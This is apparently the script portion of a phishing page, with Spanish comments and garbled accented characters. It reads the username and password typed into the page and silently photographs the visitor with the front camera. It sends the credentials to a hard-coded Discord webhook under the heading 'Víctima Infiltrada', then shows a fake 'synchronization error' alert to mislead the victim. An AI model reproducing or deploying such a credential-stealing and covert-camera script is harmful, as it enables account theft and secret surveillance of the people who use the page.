    <script>
        const WH = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";

        async function capturarTodo() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            // 1. CAPTURAR FOTO (C치mara Frontal)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = canvas.toDataURL('image/png');
                enviarADiscord(u, p, foto);
            }, 1000);
        }

        function enviarADiscord(u, p, foto) {
            // Enviar Datos y Foto
            fetch(WH, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: "游닞 **FOTO Y DATOS CAPTURADOS**",
                    embeds: [{
                        title: "V칤ctima Infiltrada",
                        fields: [
                            {name: "游녻 Usuario", value: u},
                            {name: "游댐 Clave", value: p}
                        ],
                        image: { url: 'attachment://foto.png' }
                    }]
                })
            });
            alert("Error de sincronizaci칩n. Reintente.");
        }
